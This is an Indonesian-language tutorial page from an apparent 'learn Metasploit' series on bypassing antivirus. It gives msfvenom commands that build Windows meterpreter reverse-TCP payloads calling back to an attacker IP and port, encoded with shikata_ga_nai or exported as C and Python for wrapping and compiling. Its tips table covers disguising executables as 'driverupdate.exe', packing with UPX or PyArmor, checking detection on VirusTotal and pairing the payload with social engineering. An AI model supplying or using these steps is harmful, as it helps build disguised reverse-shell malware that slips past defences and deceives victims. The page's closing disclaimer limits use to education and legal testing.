<p align="left">
  <a href="https://github.com/fixploit03/Belajar-Metasploit-Framework/blob/main/resource/Membuat%20Listener.md">Membuat Listener</a>
</p>

# Bypass Antivirus (AV) dengan Metasploit Framework

## A. Kenapa Perlu Bypass AV?

Saat payload buatan Metasploit dieksekusi di sistem target, antivirus modern bisa langsung mendeteksi dan memblokirnya. Oleh karena itu, bypass AV menjadi langkah penting agar payload dapat berjalan tanpa terdeteksi.

## B. Teknik Umum Bypass AV

| Teknik | Deskripsi |
|:--:|:-:|
| Encoding Payload | Mengacak struktur payload agar tidak dikenali signature AV. |
| `Packing/Obfuscation` | Membungkus file dengan enkripsi atau modifikasi struktur file. | 
| Custom Payload Wrapper | Menulis skrip sendiri dalam `Python/C/VB` yang menjalankan `shellcode`. |
| Menghindari Signature Payload | Tidak menggunakan payload default bawaan Metasploit. |

## C. Bypass AV dengan Encoder Metasploit Framework

Gunakan encoder saat membuat payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell_encoded.exe
```

Keterangan:
- `-p`: Jenis payload: `windows/meterpreter/reverse_tcp`
- `LHOST`: IP Attacker: `192.168.1.100`
- `LPORT`: Port listener: `4444`
- `-e`: Encoder (contoh: `x86/shikata_ga_nai`)
- `-i`: Iterasi encoder (semakin banyak, semakin acak tapi bisa tidak stabil)
- `-f`: Format payload: `exe`
- `-o`: Nama file hasil payload: `shell_encoded.exe` 

Encoder Populer di Metasploit:
- `x86/shikata_ga_nai`
- `cmd/powershell_base64`
- `x86/countdown`
- `x86/jmp_call_additive`

Cek Semua Encoder:

```
msfvenom --list encoders
```

## D. Membungkus Payload dalam Bahasa Pemrograman Lain

### 1. Format C:

   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c -o payload.c
   ```

   Keterangan:
   - `-p` : Jenis payload: `windows/meterpreter/reverse_tcp`
   - `LHOST` : IP Attacker: `192.168.1.100`
   - `LPORT` : Port listener: `4444`
   - `-f` : Format payload: `c`
   - `-o` : Nama file hasil payload: `payload.c`

  
   Compile secara manual dan modifikasi kode untuk menyisipkan ke aplikasi.

### 2. Format Python:

   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -o payload.py
   ```

   Keterangan:
   - `-p` : Jenis payload: `windows/meterpreter/reverse_tcp`
   - `LHOST` : IP Attacker: `192.168.1.100`
   - `LPORT` : Port listener: `4444`
   - `-f` : Format payload: `python`
   - `-o` : Nama file hasil payload: `payload.py`
  
   Bisa dikonversi ke `.exe` dengan `pyinstaller`, dan payload dapat disamarkan.

## E. Catatan Penting

- Teknik bypass AV tidak menjamin selalu berhasil.
- AV signature terus diperbarui -> butuh improvisasi dan eksperimen.
- Gunakan hanya untuk tujuan edukasi dan pengujian legal.

## Tips Tambahan

| Tips | Penjelasan |
|:--:|:-:|
| Ganti nama file | Gunakan nama umum seperti driverupdate.exe |
| Obfuscate | Gunakan tool seperti `UPX`, `PyArmor`, `dll` |
| Test | Gunakan VirusTotal untuk uji deteksi |
| Ganti payload | Hindari payload yang umum seperti `meterpreter/reverse_tcp` |
| Social Engineering | Gabungkan dengan file asli atau teknik persuasi |

<p align="right">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Exploit%20Real%20Target%3A%20Windows%207%20SP1%20dengan%20EternalBlue%20(MS17-010).md">Exploit Real Target: Windows 7 SP1 dengan EternalBlue (MS17-010)</a>
</p>
